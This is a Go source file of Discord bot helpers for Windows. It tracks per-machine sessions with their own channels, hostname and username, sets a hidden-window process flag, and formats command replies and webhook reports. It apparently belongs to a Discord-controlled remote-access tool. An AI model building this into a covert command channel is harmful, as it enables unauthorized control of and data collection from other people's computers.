//go:build windows

package commands

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
)

const createNoWindow = 0x08000000

var (
	stateMu        sync.RWMutex
	sessionID      string
	sessionNum     int
	sessionChannel string
	hostName       = "desconocido"
	userName       = "desconocido"

	CancelRoot context.CancelFunc
)

func SetSessionInfo(id string, num int, channel, host, user string) {
	stateMu.Lock()
	defer stateMu.Unlock()
	sessionID = id
	sessionNum = num
	sessionChannel = channel
	hostName = host
	userName = user
}

func SessionID() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionID
}

func SessionNumber() int {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionNum
}

func SessionChannel() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return sessionChannel
}

func Hostname() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return hostName
}

func Username() string {
	stateMu.RLock()
	defer stateMu.RUnlock()
	return userName
}

func webhookFields(extra ...util.EmbedField) []util.EmbedField {
	fields := []util.EmbedField{
		{Name: "hostname", Value: Hostname(), Inline: true},
	}
	if num := SessionNumber(); num > 0 {
		fields = append(fields, util.EmbedField{
			Name:   "sesion",
			Value:  fmt.Sprintf("sesion-%d", num),
			Inline: true,
		})
	}
	return append(fields, extra...)
}

func Defer(s *discordgo.Session, i *discordgo.InteractionCreate) error {
	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseDeferredChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{},
	})
}

func Reply(s *discordgo.Session, i *discordgo.InteractionCreate, content string) error {
	return s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{Content: content},
	})
}

func Finish(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	chunks := util.Chunk(content, 1900)
	first := chunks[0]
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Content: &first}); err != nil {
		return
	}
	for _, chunk := range chunks[1:] {
		part := chunk
		if _, err := s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{Content: part}); err != nil {
			return
		}
	}
}

func FinishEmbed(s *discordgo.Session, i *discordgo.InteractionCreate, embed *discordgo.MessageEmbed) {
	embeds := []*discordgo.MessageEmbed{embed}
	_, _ = s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{Embeds: &embeds})
}

func FollowupChunks(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
	for _, chunk := range util.Chunk(content, 1900) {
		part := chunk
		if _, err := s.FollowupMessageCreate(i.Interaction, true, &discordgo.WebhookParams{Content: part}); err != nil {
			return
		}
	}
}

func StringOption(i *discordgo.InteractionCreate, name string) string {
	if i.Type != discordgo.InteractionApplicationCommand {
		return ""
	}
	for _, opt := range i.ApplicationCommandData().Options {
		if opt.Name == name && opt.Type == discordgo.ApplicationCommandOptionString {
			return opt.StringValue()
		}
	}
	return ""
}

func IntOption(i *discordgo.InteractionCreate, name string) int64 {
	if i.Type != discordgo.InteractionApplicationCommand {
		return 0
	}
	for _, opt := range i.ApplicationCommandData().Options {
		if opt.Name == name && opt.Type == discordgo.ApplicationCommandOptionInteger {
			return opt.IntValue()
		}
	}
	return 0
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	if max <= 0 {
		return ""
	}
	return util.SafeCut(s, max) + "…"
}

func nowTimestamp() string {
	return time.Now().UTC().Format(time.RFC3339)
}

func formatInt(v int64) string {
	return strconv.FormatInt(v, 10)
}

func isBlank(s string) bool {
	return strings.TrimSpace(s) == ""
}
